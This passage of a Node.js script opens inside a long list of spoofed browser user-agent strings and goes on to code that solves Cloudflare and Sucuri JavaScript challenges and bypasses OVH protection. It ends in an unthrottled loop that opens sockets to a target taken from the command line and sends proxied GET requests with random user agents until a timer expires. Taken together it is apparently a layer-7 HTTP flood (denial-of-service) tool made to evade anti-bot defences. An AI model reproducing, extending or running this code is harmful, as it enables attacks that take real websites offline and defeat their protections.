        "Opera/9.01 (Windows NT 5.1; U; bg)",
        "Opera/9.01 (Windows NT 5.1)",
        "Opera/9.01 (Windows NT 5.0; U; en)",
        "Opera/9.01 (Windows NT 5.0; U; de)",
        "Opera/9.01 (Macintosh; PPC Mac OS X; U; it)",
        "Opera/9.01 (Macintosh; PPC Mac OS X; U; en)",
        "More Opera 9.01 user agents strings -->>",
        "Opera/9.00 (X11; Linux i686; U; pl)",
        "Opera/9.00 (X11; Linux i686; U; en)",
        "Opera/9.00 (X11; Linux i686; U; de)",
        "Opera/9.00 (Windows; U)",
        "Opera/9.00 (Windows NT 5.2; U; ru)",
        "Opera/9.00 (Windows NT 5.2; U; pl)",
        "Opera/9.00 (Windows NT 5.2; U; en)",
        "Opera/9.00 (Windows NT 5.1; U; ru)",
        "Opera/9.00 (Windows NT 5.1; U; pl)",
        "Opera/9.00 (Windows NT 5.1; U; nl)",
        "Opera/9.00 (Windows NT 5.1; U; ja)",
        "Opera/9.00 (Windows NT 5.1; U; it)",
        "Opera/9.00 (Windows NT 5.1; U; fr)",
        "Opera/9.00 (Windows NT 5.1; U; fi)",
        "Opera/9.00 (Windows NT 5.1; U; es-es)",
        "Opera/9.00 (Windows NT 5.1; U; en)",
        "Opera/9.00 (Windows NT 5.1; U; de)",
        "Opera/9.00 (Windows NT 5.0; U; en)",
        "Opera/9.00 (Nintendo Wii; U; ; 1038-58; Wii Internet Channel/1.0; en)",
        "Opera/9.00 (Macintosh; PPC Mac OS X; U; es)",
        "More Opera 9.00 user agents strings -->>",
        "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Opera 8.65 [en]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; Sprint:PPC-6700) Opera 8.65 [en]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 360x360)Opera 8.65 [en]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 360x360) Opera 8.65 [en]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x360) Opera 8.65 [zh-cn]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x360) Opera 8.65 [nl]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x360) Opera 8.65 [de]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x240) Opera 8.65 [en]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC) Opera 8.65 [en]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Opera 8.60 [en]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x360) Opera 8.60 [en]",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x240) Opera 8.60 [en]",
        "Opera/8.54 (X11; Linux i686; U; pl)",
        "Opera/8.54 (X11; Linux i686; U; de)",
        "Opera/8.54 (Windows NT 5.1; U; ru)",
        "Opera/8.54 (Windows NT 5.1; U; pl)",
        "Opera/8.54 (Windows NT 5.1; U; en)",
        "Opera/8.54 (Windows NT 5.0; U; en)",
        "Opera/8.54 (Windows NT 5.0; U; de)",
        "Opera/8.54 (Windows NT 4.0; U; zh-cn)",
        "Opera/8.54 (Windows 98; U; en)",
        "Mozilla/5.0 (Windows NT 5.1; U; pl) Opera 8.54",
        "Mozilla/5.0 (Windows 98; U; en) Opera 8.54",
        "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.54",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.54",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.54",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; fr) Opera 8.54",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.54",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.54",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; da) Opera 8.54",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; pl) Opera 8.54",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.54",
        "More Opera 8.54 user agents strings -->>",
        "Opera/8.53 (Windows NT 5.2; U; en)",
        "Opera/8.53 (Windows NT 5.1; U; pt)",
        "Opera/8.53 (Windows NT 5.1; U; en)",
        "Opera/8.53 (Windows NT 5.1; U; de)",
        "Opera/8.53 (Windows NT 5.0; U; en)",
        "Opera/8.53 (Windows 98; U; en)",
        "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.53",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.53",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.53",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en) Opera 8.53",
        "Opera/8.52 (X11; Linux x86_64; U; en)",
        "Opera/8.52 (X11; Linux i686; U; en)",
        "Opera/8.52 (Windows NT 5.1; U; ru)",
        "Opera/8.52 (Windows NT 5.1; U; en)",
        "Opera/8.52 (Windows NT 5.0; U; en)",
        "Opera/8.52 (Windows ME; U; en)",
        "Mozilla/5.0 (X11; Linux i686; U; en) Opera 8.52",
        "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
        "Mozilla/5.0 (Windows NT 5.1; U; de) Opera 8.52",
        "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.52",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.52",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.52",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.52",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.52",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en) Opera 8.52",
        "Opera/8.51 (X11; U; Linux i686; en-US; rv:1.8)",
        "Opera/8.51 (X11; Linux x86_64; U; en)",
        "Opera/8.51 (X11; Linux i686; U; en)",
        "Opera/8.51 (Windows NT 5.1; U; pl)",
        "Opera/8.51 (Windows NT 5.1; U; nb)",
        "Opera/8.51 (Windows NT 5.1; U; fr)",
        "Opera/8.51 (Windows NT 5.1; U; en)",
        "Opera/8.51 (Windows NT 5.1; U; de)",
        "Opera/8.51 (Windows NT 5.0; U; en)",
        "Opera/8.51 (Windows 98; U; en)",
        "Opera/8.51 (Macintosh; PPC Mac OS X; U; de)",
        "Opera/8.51 (FreeBSD 5.1; U; en)",
        "Mozilla/5.0 (Windows NT 5.1; U; ru) Opera 8.51",
        "Mozilla/5.0 (Windows NT 5.1; U; fr) Opera 8.51",
        "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
        "Mozilla/5.0 (Windows ME; U; en) Opera 8.51",
        "Mozilla/5.0 (Macintosh; PPC Mac OS X; U; en) Opera 8.51",
        "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; ru) Opera 8.51",
        "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.51",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.51",
        "More Opera 8.51 user agents strings -->>",
        "Opera/8.50 (Windows NT 5.1; U; ru)",
        "Opera/8.50 (Windows NT 5.1; U; pl)",
        "Opera/8.50 (Windows NT 5.1; U; fr)",
        "Opera/8.50 (Windows NT 5.1; U; es-ES)",
        "Opera/8.50 (Windows NT 5.1; U; en)",
        "Opera/8.50 (Windows NT 5.1; U; de)",
        "Opera/8.50 (Windows NT 5.0; U; fr)",
        "Opera/8.50 (Windows NT 5.0; U; en)",
        "Opera/8.50 (Windows NT 5.0; U; de)",
        "Opera/8.50 (Windows NT 4.0; U; zh-cn)",
        "Opera/8.50 (Windows ME; U; en)",
        "Opera/8.50 (Windows 98; U; ru)",
        "Opera/8.50 (Windows 98; U; en)",
        "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
        "Mozilla/5.0 (Windows NT 5.1; U; de) Opera 8.50",
        "Mozilla/5.0 (Windows NT 5.0; U; de) Opera 8.50",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; ru) Opera 8.50",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 8.50",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; tr) Opera 8.50",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.50",
        "More Opera 8.50 user agents strings -->>",
        "Opera/8.10 (Windows NT 5.1; U; en)",
        "Opera/8.02 (Windows NT 5.1; U; ru)",
        "Opera/8.02 (Windows NT 5.1; U; en)",
        "Opera/8.02 (Windows NT 5.1; U; de)",
        "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
        "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.02",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.02",
        "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
    ],
    Timeout = 6000, // Cloudflare requires a delay of 5 seconds, so wait for at least 6.
    WAF = true,
    cloudscraper = {};


const {
    constants
} = require('crypto');

const sleep =
    (waitTimeInMs) =>
    new Promise(resolve =>
        setTimeout(resolve, waitTimeInMs));

sleep(3000).then(() => {})

cloudscraper.get = function(url, callback, headers) {
    performRequest({
        method: 'GET',
        url: url,
        headers: headers
    }, callback);
};


cloudscraper.get(url, function(error, response) {
    if (error) {} else {
        var parsed = JSON.parse(JSON.stringify(response));
        cookie = parsed["request"]["headers"]["cookie"];
        if (cookie == undefined) {
            cookie = parsed["headers"]["set-cookie"];
        }
        ua = parsed["request"]["headers"]["User-Agent"];
    }
});

cloudscraper.post = function(url, body, callback, headers) {
    var data = '',
        bodyType = Object.prototype.toString.call(body);

    if (bodyType === '[object String]') {
        data = body;
    } else if (bodyType === '[object Object]') {
        data = Object.keys(body).map(function(key) {
            return key + '=' + body[key];
        }).join('&');
    }

    headers = headers || {};
    headers['Content-Type'] = headers['Content-Type'] || 'application/x-www-form-urlencoded; charset=UTF-8';
    headers['Content-Length'] = headers['Content-Length'] || data.length;

    performRequest({
        method: 'POST',
        body: data,
        url: url,
        headers: headers
    }, callback);
}

cloudscraper.request = function(options, callback) {
    performRequest(options, callback);
}

function performRequest(options, callback) {
    var method;
    options = options || {};
    options.headers = options.headers || {};
    makeRequest = requestMethod(options.method);

    if ('encoding' in options) {
        options.realEncoding = options.encoding;
    } else {
        options.realEncoding = 'utf8';
    }
    options.encoding = null;

    if (!options.url || !callback) {
        throw new Error('To perform request, define both url and callback');
    }

    options.headers['User-Agent'] = options.headers['User-Agent'] || UserAgent;

    makeRequest(options, function(error, response, body) {
        var validationError;
        var stringBody;

        if (error || !body || !body.toString) {
            return callback({
                errorType: 0,
                error: error
            }, body, response);
        }

        stringBody = body.toString('utf8');

        if (validationError = checkForErrors(error, stringBody)) {
            return callback(validationError, body, response);
        }

        // If body contains specified string, solve challenge
        if (stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
            setTimeout(function() {
                return solveChallenge(response, stringBody, options, callback);
            }, Timeout);
        } else if (stringBody.indexOf('You are being redirected...') !== -1 ||
            stringBody.indexOf('sucuri_cloudproxy_js') !== -1) {
            setCookieAndReload(response, stringBody, options, callback);
        } else {
            // All is good
            processResponseBody(options, error, response, body, callback);
        }
    });
}




function checkForErrors(error, body) {
    var match;

    if (error) {
        return {
            errorType: 0,
            error: error
        };
    }

    if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
        return {
            errorType: 1
        };
    }

    match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);

    if (match) {
        return {
            errorType: 2,
            error: parseInt(match[1])
        };
    }

    return false;
}


function solveChallenge(response, body, options, callback) {
    var challenge = body.match(/name="jschl_vc" value="(\w+)"/),
        host = response.request.host,
        makeRequest = requestMethod(options.method),
        jsChlVc,
        answerResponse,
        answerUrl;

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract challengeId (jschl_vc) from page'
        }, body, response);
    }

    jsChlVc = challenge[1];

    challenge = body.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract method from setTimeOut wrapper'
        }, body, response);
    }

    challenge_pass = body.match(/name="pass" value="(.+?)"/)[1];

    challenge = challenge[1];

    challenge = challenge.replace(/a\.value =(.+?) \+ .+?;/i, '$1');

    challenge = challenge.replace(/\s{3,}[a-z](?: = |\.).+/g, '');
    challenge = challenge.replace(/'; \d+'/g, '');

    try {
        answerResponse = {
            'jschl_vc': jsChlVc,
            'jschl_answer': (eval(challenge) + response.request.host.length),
            'pass': challenge_pass
        };
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }

    answerUrl = response.request.uri.protocol + '//' + host + '/cdn-cgi/l/chk_jschl';

    options.headers['Referer'] = response.request.uri.href; // Original url should be placed as referer
    options.url = answerUrl;
    options.qs = answerResponse;

    makeRequest(options, function(error, response, body) {

        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }

        if (response.statusCode === 302) {
            options.url = response.headers.location;
            delete options.qs;
            makeRequest(options, function(error, response, body) {
                processResponseBody(options, error, response, body, callback);
            });
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function setCookieAndReload(response, body, options, callback) {
    var challenge = body.match(/S='([^']+)'/);
    var makeRequest = requestMethod(options.method);

    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract cookie generation code from page'
        }, body, response);
    }

    var base64EncodedCode = challenge[1];
    var cookieSettingCode = new Buffer(base64EncodedCode, 'base64').toString('ascii');

    var sandbox = {
        location: {
            reload: function() {}
        },
        document: {}
    };
    vm.runInNewContext(cookieSettingCode, sandbox);
    try {
        cookies.push(sandbox.document.cookie);
        jar.setCookie(sandbox.document.cookie, response.request.uri.href, {
            ignoreError: true
        });
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }

    makeRequest(options, function(error, response, body) {
        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }
        processResponseBody(options, error, response, body, callback);
    });
}

function requestMethod(method) {
    method = method.toUpperCase();

    return method === 'POST' ? request.post : request.get;
}

function processResponseBody(options, error, response, body, callback) {
    if (typeof options.realEncoding === 'string') {
        body = body.toString(options.realEncoding);
        if (validationError = checkForErrors(error, body)) {
            return callback(validationError, response, body);
        }
    }


    callback(error, response, body);
}

process.on('uncaughtException', function(err) {

})

process.on('unhandledRejection', function(err) {

});

var Xbypass = {
    http(method, url, proxy) {
        requestModule({
            method: method,
            proxy: 'http://' + proxy,
            headers: {
                'UserAgent': UserAgent[Math.floor(Math.random() * UserAgent.length)],
                'Cookie':  process.argv[6]

            },
            url: url
        }, function(err, response, body) {});
    },
    Xbypass(method, url, proxy) {
        performRequest({
            method: method,
            proxy: 'http://' + proxy,
            headers: {
                'UserAgent': UserAgent[Math.floor(Math.random() * UserAgent.length)],
                'threads': process.argv[7]
                
            },
            url: url
        }, function(err, response, body) {});
    }
}

module.exports = function OVHUAM() {
    const request = require('request');

    function Bypasser(body, callback) {
        callback('xf_id=' + body.match(/\|max\|(.*?)\|/)[1]);
    }

    return function bypass(proxy, uagent, callback) {
        request({
            url: l7.target,
            method: "GET",
            gzip: true,
            proxy: proxy,
            headers: {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': uagent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US'
            }
        }, (err, res, body) => {
            if (err || !res || !body || body.indexOf('|href|max|') == -1) {
                return false;
            }
            Bypasser(body, cookies => {
                request({
                    url: l7.target,
                    method: "GET",
                    gzip: true,
                    proxy: proxy,
                    followAllRedirects: true,
                    jar: true,
                    headers: {
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': uagent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cookie': cookies
                    }
                }, (err, res, body) => {
                    if (res && res.request.headers.Cookie) {
                        //console.log(res.request.headers.Cookie);
                        callback(res.request.headers.Cookie);
                    }
                    /*if (err || !res || !body) {
                        return false;
                    }*/
                });
            })
        });
    }
}
setTimeout(function() {
    process.exit(1);
}, process.argv[3] /*conf.time*/ * 1000);

setInterval(function() {
    var string = require('net').Socket();
    string.setKeepAlive(true, 5000)
    string.connect(80, process.argv[2] /*conf.url*/ );
    string.setTimeout(10000);
    Xbypass.http('GET', process.argv[2] /*conf.url*/ , proxies[Math.floor(Math.random() * proxies.length)]);
});
setTimeout(() => clearInterval(int), time * 1000)
